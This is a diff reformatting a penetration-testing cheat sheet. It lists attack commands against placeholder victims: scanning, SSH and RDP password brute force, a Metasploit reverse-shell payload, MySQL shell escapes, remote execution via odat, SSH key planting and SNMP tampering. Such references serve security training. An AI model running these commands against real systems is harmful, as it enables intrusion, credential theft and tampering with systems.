@@ -214,7 +214,9 @@ finger "|/bin/ls -a /@[victim_ip]"
 --------------------------------------------------------------------------------------------------------------------------------
 # HTTP 
 
-## Directory_scanning
+Is an application-layer protocol for transmitting hypermedia documents, such as HTML. It was designed for communication between web browsers and web servers
+
+### Directory_scanning
 - dir mode
   - gobuster dir -u https://10.10.1.x -w ~/wordlists/shortlist.txt
 - dns mode
@@ -233,12 +235,13 @@ finger "|/bin/ls -a /@[victim_ip]"
 - proxy chain
   -  gobuster -o gobuster.txt -e -u http://10.11.1.x/ -w ~/wordlist/shortlist.txt
 
-## Subdomain_scanning
+#### Subdomain searching
 
-## Nikto_scan
-nikto -h [victim_ip]
-nikto -Display V -h [victim_ip]
-nikto -Display V -o results.html -Format htm -h [victim_ip]
+#### Nikto scanner
+
+- nikto -h [victim_ip]
+- nikto -Display V -h [victim_ip]
+- nikto -Display V -o results.html -Format htm -h [victim_ip]
 ```
 0 – File Upload
 1 – Interesting File / Seen in logs
@@ -257,46 +260,38 @@ x – Reverse Tuning Options (i.e., include all except specified)
 
 example: nikto -Tuning 9 -h [victim_ip]6
 ```
-## Everything except number 6 - DOS
+- Run every scan except number 6 - DOS
 ```
 nikto -Tuning x 6 -h [victim_ip]
 ```
-## WhatWeb
-**Another enum type tool like nikto but looks to be more advanced and prettier in output**
+
+#### WhatWeb
+It is another enum type tool like nikto but looks to be more advanced and prettier in output.
+
+- Usage: 
 ```
 whatweb -v -a 4 http://[victim_ip]
 ```
 
-## Cewl
+#### Cewl
+Spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper
+- Usage:
 ```
-create dict via https://tools.kali.org/password-attacks/cewl and use as dirb list scan
-```
-
-## nmap
-
-### nmap_port_scan
-```
-nmap -p- --min-rate 10000 [victim_ip]
-```
-
-### heartbleed
-```
-nmap -p [victim_port] --script ssl-heartbleed [victim_ip]
-```
-
-### vuln
-```
-nmap -p [victim_port] --script vuln [victim_ip]
+cewl http://some.app/for/scan --with-numbers > wordlist
 ```
 --------------------------------------------------------------------------------------------------------------------------------
-## SQL
+--------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------
 
-## sql_nmap_scan 
+# SQL
+
+#### sql nmap scan 
 - nmap -sV -Pn -vv --script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 [victim_ip] -p 3306
 - nmap -sV -Pn -vv -script=mysql* [victim_ip] -p 3306
 - nmap -sU --script=ms-sql-info [vicrim_ip] -p 3306
 
-## sql_metasploit
+#### sql metasploit scan
 ```
   msf > use auxiliary/scanner/mssql/mssql_ping
   msf> use auxiliary/scanner/mssql/mssql_login
@@ -308,13 +303,13 @@ Gain shell using gathered credentials
   msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
 ```
 
-## mysql_commands
+#### mysql commands
 ```
 mysql> select do_system('id');
 mysql> \! sh
 ```
 
-#### mssql_erver_config_file
+#### mssql server config file
 ```
 cat freetds.conf
 
@@ -325,16 +320,21 @@ user=sa
 
 root@kali:~/dirsearch# sqsh -S someserver -U sa -P PASS -D DB_NAME
 ```
-## mysqldump
+
+#### tool mysqldump
 
 binary: mysqldump
 ```
 mysqldump --user=<user_name> --password=<user_password> --host=localhost <database name>
 
 for example:
-mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
+mysqldump --user=user_name --password=password_value --host=localhost Magic
 ```
 -------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+
 # Oracle 
 
 tool: https://github.com/quentinhardy/odat
@@ -388,7 +388,12 @@ Run netcat
  nc -lnvp <your_port>
 python3 odat.py externaltable -s <victim_ip> -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
 ```
+
 --------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+
 # NFS
 - The Network File System (NFS) is a client/server application that lets a computer user view and optionally store and update files on a remote computer as though they were on the user's own computer. The NFS protocol is one of several distributed file system standards for network-attached storage (NAS).
 
@@ -410,21 +415,26 @@ mount -t nfs [ip]:/home/vulnix /tmp/nfs -nolock
 nmap -sV --script=nfs-showmount [victim_ip]
 ```
 --------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+
 # SSH 
 
-## SSH enumeration metasploit module
+#### SSH enumeration with metasploit module
 ```
 use auxiliary/scanner/ssh/ssh_enumusers
 set user_file /usr/share/wordlists/metasploit/unix_users.txt or set user_file /usr/share/seclists/Usernames/Names/names.txt
 run
 ```
-## SSH hydra bruteforce
+
+#### SSH data bruteforce with hydra
 ```
 hydra -v -V -l root -P password-file.txt [victim_ip] ssh
 hydra -v -V -L user.txt -P /usr/share/wordlists/rockyou.txt -t 16 [victim_ip] ssh
 ```
 
-## ssh keygen process
+#### ssh keygen process
 ```
 ssh-keygen
 mkdir /mnt/user_name/.ssh
@@ -432,71 +442,88 @@ touch /mnt/user_name/.ssh/authorized_keys
 cat ~/.ssh/id_rsa.pub > /mnt/user_name/.ssh/authorized_keys
 ssh use_name@[victim_ip
 ```
-## usefull ssh exploits
+
+#### usefull ssh exploits
 - https://github.com/offensive-security/exploitdb/blob/master/exploits/linux/remote/40136.py
 
 - https://github.com/g0tmi1k/debian-ssh
 
 --------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+
 # RDP
 
-## Connect to remote desktop 
+#### Connect to remote desktop 
 ```
 rdesktop -g 1440x900 -u user_login -p user_pass [victim_ip]
 ```
 
-## rdp nmap scan
+#### rdp nmap scan
 ```
 nmap -p 3389 --script rdp-ntlm-info [victim_ip]
 ```
 
-## bruteforce rdp credentials
+#### bruteforce rdp credentials
 ```
 hydra -t 4  -l administrator -P /usr/share/wordlists/rockyou.txt rdp://[victim_ip]
 ncrack -vv --user administrator -P password-file.txt rdp://[victim_ip]
 ```
+
 --------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+
 # rpc
 ```
 rpcinfo -p [victim_ip]
 ```
 
-## nmap
+#### rpc nmap scan
 ```
 nmap [vitim_ip] --script msrpc-enum
 ```
 
-## metasploit
+#### rpc metasploit scan
 ```
 msf> use exploit/windows/dcerpc/ms03_026_dcom
 ```
 --------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------
+
 # SNMP
 
-## SNMP_Description
+#### SNMP_Description
 
 SNMP is based on UDP, a simple, stateless protocol, and therefore susceptible to IP spoofing and replay attacks. SNMP information and credentials can be easily intercepted over a local network.
 
-## MIB_Tree
+#### MIB Tree
 
 SNMP Managment Information Base (MIB) is a database contains info related to network management. 
 
-## nmap
+#### nmap
 ```
 nmap -sU --open -p 161, [victim_ip] 
 ```
 
-## snmpwalk
+#### snmpwalk scan 
 - snmpwalk -c public [victim_ip] -v1
 - snmpwalk -c private [victim_ip] -v1
 - snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
 - snmpset -v 1 -c public [victim_ip] .1.3.6.1.2.1.1.5 s HACKED
 - snmpwalk -c public [victim_ip] -v1 -0n | grep '1.3.6.1.2.1.1.5'
 
-## SNMP-CHECK
+#### SNMP-CHECK
 - snmp-check -c public 10.11.1.x
 
 -------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
+
 # SMTP
 
 ## Netcat
